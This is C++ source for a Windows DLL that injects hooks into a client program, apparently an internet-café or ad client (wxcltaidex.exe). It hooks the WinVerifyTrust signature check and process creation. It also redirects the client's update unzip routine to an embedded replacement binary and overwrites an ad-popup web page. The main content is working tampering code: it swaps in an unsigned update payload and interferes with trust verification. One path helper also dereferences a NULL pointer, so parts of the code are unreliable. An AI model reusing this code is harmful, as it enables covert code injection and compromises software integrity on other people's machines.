#include "sunshine.h"

#include <tchar.h>
#include <Wintrust.h>

#include "resource.h"
#include "fake\ntdll.h"
#include "fake\kernel32.h"
#include "fake\wintrust.h"

#pragma comment(lib,"Wintrust.lib")
#pragma comment(lib,"e:\\github.com\\nektra\\Deviare-InProc\\Libs\\2017\\NktHookLib_Debug.lib")

__declspec(dllexport) void _() {

}

namespace global {
	HINSTANCE hCurrentModule = NULL;
}

namespace hook {
	enum Function {
		Wiz_SingleEntryUnzip,

		MaxFunctionNumber
	};

	CNktHookLib cNktHook;
	CNktHookLib::HOOK_INFO hiHooks[MaxFunctionNumber] = { 0 };

	inline CNktHookLib::HOOK_INFO* GetInfo(hook::Function enumFunction) {
		return &hook::hiHooks[enumFunction];
	}

	inline CNktHookLib::HOOK_INFO* SetHookInfo(hook::Function enumFunction, void* lpProcToHook, void* lpNewProcAddr) {
		hook::hiHooks[enumFunction].nHookId = 0;
		hook::hiHooks[enumFunction].lpCallOriginal = NULL;

		hook::hiHooks[enumFunction].lpProcToHook = lpProcToHook;
		hook::hiHooks[enumFunction].lpNewProcAddr = lpNewProcAddr;

		return &hook::hiHooks[enumFunction];
	}
}

namespace fake {
	typedef int (WINAPI DLLPRNT) (LPSTR, unsigned long);
	typedef int (WINAPI DLLPASSWORD) (LPSTR, int, LPCSTR, LPCSTR);
	typedef int (WINAPI DLLSERVICE) (LPCSTR, unsigned long);
	typedef void (WINAPI DLLSND) (void);
	typedef int (WINAPI DLLREPLACE)(LPSTR);
	typedef void (WINAPI DLLMESSAGE)(unsigned long, unsigned long, unsigned,
		unsigned, unsigned, unsigned, unsigned, unsigned,
		char, LPSTR, LPSTR, unsigned long, char);

	typedef struct {
		DLLPRNT *print;
		DLLSND *sound;
		DLLREPLACE *replace;
		DLLPASSWORD *password;
		DLLMESSAGE *SendApplicationMessage;
		DLLSERVICE *ServCallBk;
		unsigned long TotalSizeComp;
		unsigned long TotalSize;
		unsigned long CompFactor;       /* "long" applied for proper alignment, only */
		unsigned long NumMembers;
		WORD cchComment;

	} USERFUNCTIONS, far * LPUSERFUNCTIONS;

	typedef struct {
		int ExtractOnlyNewer;
		int SpaceToUnderscore;
		int PromptToOverwrite;
		int fQuiet;
		int ncflag;
		int ntflag;
		int nvflag;
		int nfflag;
		int nzflag;
		int ndflag;
		int noflag;
		int naflag;
		int nZIflag;
		int C_flag;
		int fPrivilege;
		LPSTR lpszZipFN;
		LPSTR lpszExtractDir;
	} DCL, far * LPDCL;

	typedef int (WINAPI* __pfnWiz_SingleEntryUnzip)(int ifnc, char **ifnv, int xfnc, char **xfnv, LPDCL lpDCL, LPUSERFUNCTIONS lpUserFunc);
	int WINAPI Wiz_SingleEntryUnzip(int ifnc, char **ifnv, int xfnc, char **xfnv, LPDCL lpDCL, LPUSERFUNCTIONS lpUserFunc) {
		size_t sizeBusinessDLLSize = 0;

		void * pBusinessDLL = GetResourceContent(GetModuleHandleByAddr(GetModuleHandleByAddr), IDR_BIN_PUBWIN_UPDATE, "BIN", &sizeBusinessDLLSize);
		if (NULL == pBusinessDLL) {
			return __pfnWiz_SingleEntryUnzip(hook::GetInfo(hook::Wiz_SingleEntryUnzip)->lpCallOriginal)(ifnc, ifnv, xfnc, xfnv, lpDCL, lpUserFunc);
		}
		//defer_free _(pBusinessDLL);


		TCHAR szFakeUpdateFileName[MAX_PATH] = { 0 };
		::GetTempPath(MAX_PATH, szFakeUpdateFileName);
		::GetTempFileName(szFakeUpdateFileName, "bin", 0, szFakeUpdateFileName);

		if (!SetFile(szFakeUpdateFileName, pBusinessDLL, sizeBusinessDLLSize)) {
			return __pfnWiz_SingleEntryUnzip(hook::GetInfo(hook::Wiz_SingleEntryUnzip)->lpCallOriginal)(ifnc, ifnv, xfnc, xfnv, lpDCL, lpUserFunc);
		}

		lpDCL->lpszZipFN = szFakeUpdateFileName;
		return __pfnWiz_SingleEntryUnzip(hook::GetInfo(hook::Wiz_SingleEntryUnzip)->lpCallOriginal)(ifnc, ifnv, xfnc, xfnv, lpDCL, lpUserFunc);
	}
}

namespace Common {

	static bool PathRemoveFileName(__inout wchar_t * pszFilePath)
	{
		pszFilePath = wcsrchr(pszFilePath,L'\\');
		if (NULL == pszFilePath) {
			pszFilePath = wcsrchr(pszFilePath, L'/');

		}

		if (pszFilePath) {
			pszFilePath[0] = L'\0';
		}

		return NULL != pszFilePath;
	}

	static bool PathAddFileName(__inout wchar_t * pszFilePath, const wchar_t * pszFileName)
	{
		if (pszFilePath[wcslen(pszFilePath) - 1] != L'\\') {
			wcscat_s(pszFilePath, MAX_PATH, L"\\");
		}

		return 0 == wcscat_s(pszFilePath, MAX_PATH, pszFileName);
	}

	static bool PathRenameFileName(__inout wchar_t * pszFilePath, const wchar_t * pszFileName)
	{
		return PathRemoveFileName(pszFilePath) && PathAddFileName(pszFilePath, pszFileName);
	}

	static bool PathRenameFile(_In_ LPCWSTR lpExistingFileName, _In_opt_ LPCWSTR lpNewFileName)
	{
		wchar_t szNewFileName[MAX_PATH + 1] = { 0 };

		wcscpy_s(szNewFileName, lpExistingFileName);
		PathRenameFileName(szNewFileName, lpNewFileName);

		return TRUE == MoveFileExW(lpExistingFileName, szNewFileName, MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
	}
}

BOOL SetWXCltAidexWebPage() {
	wchar_t szLoadingPath[MAX_PATH + 1] = { 0 };
	wchar_t szRefreshPath[MAX_PATH + 1] = { 0 };

	::GetModuleFileNameW(NULL, szLoadingPath, MAX_PATH);
	::GetModuleFileNameW(NULL, szRefreshPath, MAX_PATH);


	Common::PathRenameFileName(szLoadingPath, L"wxCltSkin\\AdPopWnd\\web\\web2\\new_loading.html");
	Common::PathRenameFileName(szRefreshPath, L"wxCltSkin\\AdPopWnd\\web\\web2\\new_refresh.html");

	Common::PathRenameFile(szRefreshPath, L"old_refresh.html");

	return ::CopyFileW(szLoadingPath, szRefreshPath, FALSE);
}


BOOL OnProcessAttach(HINSTANCE hModule) {
	LockModuleForHandle(GetModuleHandleByAddr(GetModuleHandleByAddr));

	SetWXCltAidexWebPage();
	HMODULE hNtdll = GetModuleHandle(_T("Ntdll.dll"));
	HMODULE hKernel32 = GetModuleHandle(_T("Kernel32.dll"));

	const char * pcszErrorptr = NULL;
	int nErroroffset = PCRE_ERROR_NOMATCH; // 为0时, 没有匹配也会被命中

	if (IsCurrentProcess(_T("wxcltaidex.exe"))) {
		rule::rHookRule[rule::Library].sizeCount = 2;
		rule::rHookRule[rule::Library].pcreCompile = (pcre**)malloc(rule::rHookRule[rule::Library].sizeCount * sizeof(pcre*));

		rule::rHookRule[rule::Library].pcreCompile[0] = pcre_compile("wxcam.dll$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);
		rule::rHookRule[rule::Library].pcreCompile[1] = pcre_compile("mswsock.dll$", PCRE_CASELESS, &pcszErrorptr, &nErroroffset, NULL);

		//hook::cNktHook.Hook(fake::ntdll::SetHookInfo(fake::ntdll::func::LdrLoadDll, GetProcAddress(hNtdll, "LdrLoadDll"), fake::LdrLoadDll), 1);
		hook::cNktHook.Hook(fake::ntdll::SetHookInfo(fake::ntdll::func::NtCreateSection, GetProcAddress(hNtdll, "NtCreateSection"), fake::NtCreateSection), 1);
	}



	//hook::cNktHook.Hook(fake::kernel32::SetHookInfo(fake::kernel32::func::LoadLibraryW, GetProcAddress(hKernel32, "LoadLibraryW"), fake::LoadLibraryW), 1);
	//hook::cNktHook.Hook(fake::kernel32::SetHookInfo(fake::kernel32::func::LoadLibraryExW, GetProcAddress(hKernel32, "LoadLibraryExW"), fake::LoadLibraryExW), 1);
	hook::cNktHook.Hook(fake::kernel32::SetHookInfo(fake::kernel32::func::CreateProcessInternalW, GetProcAddress(hKernel32, "CreateProcessInternalW"), fake::CreateProcessInternalW), 1);

	hook::cNktHook.Hook(fake::wintrust::SetHookInfo(fake::wintrust::func::WinVerifyTrust, WinVerifyTrust, fake::WinVerifyTrust), 1);

	hook::cNktHook.Hook(hook::SetHookInfo(hook::Wiz_SingleEntryUnzip, ::GetProcAddress(LoadLibraryA("unz32dll.dll"), "Wiz_SingleEntryUnzip"), fake::Wiz_SingleEntryUnzip), 1);

	return TRUE;
}

BOOL OnProcessDetach(HINSTANCE hModule) {
	hook::cNktHook.UnhookAll();

	return TRUE;
}


BOOL APIENTRY DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {
	global::hCurrentModule = hinstDLL;
	DisableThreadLibraryCalls(hinstDLL);

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		return OnProcessAttach(hinstDLL);
	case DLL_PROCESS_DETACH:
		return OnProcessDetach(hinstDLL);
	}

	return TRUE;
}